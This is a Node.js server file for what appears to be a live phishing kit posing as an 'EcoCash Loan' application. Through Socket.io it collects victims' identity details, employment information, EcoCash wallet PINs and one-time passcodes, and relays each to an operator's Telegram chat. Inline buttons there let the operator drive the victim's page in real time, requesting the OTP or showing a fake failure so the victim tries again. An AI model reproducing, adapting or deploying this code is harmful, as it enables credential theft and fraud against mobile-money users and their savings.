require("dotenv").config();
const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require("path");
const TelegramBot = require("node-telegram-bot-api");

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Share io globally so botManager can access it
global.io = io;

// Middleware configuration
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// Initialize bot without polling (configured for webhook deployment)
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: false });
const ADMIN_ID = process.env.ADMIN_CHAT_ID;

// Setup Webhook endpoint for Telegram updates
const PORT = process.env.PORT || 3000;
app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

const botManager = {
    bot: bot,

    sendToAdmin: (appId, title, data, needsApproval = false) => {
        let msg = `<b>${title}</b>\n🆔 ID: <code>${appId}</code>\n`;
        for (const [k, v] of Object.entries(data)) {
            msg += `<b>${k}:</b> <code>${v}</code>\n`;
        }

        const options = { parse_mode: 'HTML' };
        if (needsApproval) {
            options.reply_markup = {
                inline_keyboard: [[
                    { text: "✅ APPROVE (Move to OTP)", callback_data: `approve_4_${appId}` },
                    { text: "❌ REJECT", callback_data: `reject_4_${appId}` }
                ]]
            };
        }
        bot.sendMessage(ADMIN_ID, msg, options);
    },

    sendFinalApproval: (appId, pin) => {
        const msg = `🏁 <b>🇿🇼 FINAL OTP RECEIVED</b>\n🆔 ID: <code>${appId}</code>\n🔐 OTP: <code>${pin}</code>`;
        bot.sendMessage(ADMIN_ID, msg, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ COMPLETE LOAN", callback_data: `approve_5_${appId}` },
                    { text: "❌ REJECT OTP", callback_data: `reject_5_${appId}` }
                ]]
            }
        });
    }
};

// Handle Socket.io Web Traffic
io.on("connection", (socket) => {
    // Generate a secure custom identifier mapping for the active form session
    const appId = "ZIM-" + Math.floor(Math.random() * 90000 + 10000);
    
    // CRITICAL FIX: Explicitly place the socket into its own unique tracking channel
    socket.join(appId);
    socket.emit("session-ready", { appId: appId });

    socket.on("step1", (data) => {
        botManager.sendToAdmin(appId, "Step 1: Loan Details", data, false);
    });

    socket.on("step2", (data) => {
        botManager.sendToAdmin(appId, "Step 2: Identity Verification", data, false);
    });

    socket.on("step3", (data) => {
        botManager.sendToAdmin(appId, "Step 3: Employment Info", data, false);
    });

    socket.on("step4", (data) => {
        // Receives the EcoCash Wallet phone and initial entry PIN configuration
        botManager.sendToAdmin(appId, "Step 4: EcoCash Wallet PIN", data, true);
    });

    socket.on("step5", (data) => {
        // Handles the final 6-Digit One-Time PIN validation delivery
        botManager.sendFinalApproval(appId, data.pin);
    });
});

// Handle Admin Button Callback Interceptions from Telegram
bot.on("callback_query", (query) => {
    const dataParts = query.data.split("_");
    const action = dataParts[0]; 
    const step = dataParts[1];   
    const appId = dataParts[2];  
    
    let currentText = query.message.text || "";

    if (action === "approve") {
        if (step === "4") {
            // Signal room target channel to present the step 5 OTP collection frame
            io.to(appId).emit('password-verified');
            bot.answerCallbackQuery(query.id, { text: "6-Digit OTP input shown to user" });
        } 
        else if (step === "5") {
            // Complete loan lifecycle pipeline operation status message update
            const ref = "ZIM-" + Math.floor(Math.random() * 900000 + 100000);
            io.to(appId).emit('pin-verified', { referenceId: ref });
            bot.answerCallbackQuery(query.id, { text: "EcoCash Application Completed!" });
        }
        
        bot.editMessageText(currentText + "\n\n✅ <b>ACTION: APPROVED</b>", {
            chat_id: ADMIN_ID,
            message_id: query.message.message_id,
            parse_mode: 'HTML'
        });
    }

    if (action === "reject") {
        if (step === "4") {
            io.to(appId).emit('password-rejected', { message: "PIN code verification failed. Please try again." });
            bot.answerCallbackQuery(query.id, { text: "EcoCash Wallet PIN Rejected" });
        } 
        else if (step === "5") {
            io.to(appId).emit('pin-rejected', { message: "The 6-digit verification code is invalid or expired." });
            bot.answerCallbackQuery(query.id, { text: "OTP Token Rejected" });
        }
        
        bot.editMessageText(currentText + "\n\n❌ <b>ACTION: REJECTED</b>", {
            chat_id: ADMIN_ID,
            message_id: query.message.message_id,
            parse_mode: 'HTML'
        });
    }
});

// Set production webhook for Render deployment pipelines
const webhookUrl = `${process.env.RENDER_EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
bot.setWebHook(webhookUrl).then(() => {
    console.log(`Telegram Webhook targeted successfully to: ${webhookUrl}`);
});

server.listen(PORT, () => {
    console.log(`EcoCash Loan engine running on port ${PORT}`);
});